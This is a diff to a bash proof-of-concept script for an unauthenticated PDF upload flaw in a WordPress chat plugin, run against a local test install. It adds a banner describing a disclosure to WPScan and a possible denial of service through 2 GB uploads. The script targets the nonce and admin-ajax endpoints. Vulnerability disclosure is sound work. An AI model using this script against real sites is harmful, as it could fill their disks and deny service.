@@ -1,6 +1,14 @@
 #!/usr/bin/env bash
 set -e
-
+echo
+echo -e "\033[1;31m"
+echo "[!] After reporting this vulnerability to WPScan, we further verified the impact and confirmed that the upload functionality accepts extremely large PDF files without authentication."
+echo
+echo "[!] During testing, we successfully uploaded PDF files up to 2 GB in size."
+echo
+echo "[!] This demonstrates that an unauthenticated attacker can repeatedly upload very large files, potentially leading to disk space exhaustion and denial of service conditions on the affected server."
+echo -e "\033[0m"
+echo
 BASE="http://127.0.0.1/"
 AJAX="$BASE/wp-admin/admin-ajax.php"
 NONCE_URL="$BASE/wp-json/mxchat/v1/nonce"
@@ -34,7 +42,7 @@ echo "[+] Searching uploaded file..."
 FOUND=$(find /home/kali/Downloads/test/wordpress/wp-content/uploads -name "mxchat_*.pdf" 2>/dev/null | tail -1)
 
 if [ -z "$FOUND" ]; then
-  echo "[-] Uploaded file not found on disk"
+  echo "[-] Uploaded file not found on disk please check wp-content/uploads"
   exit 1
 fi
 
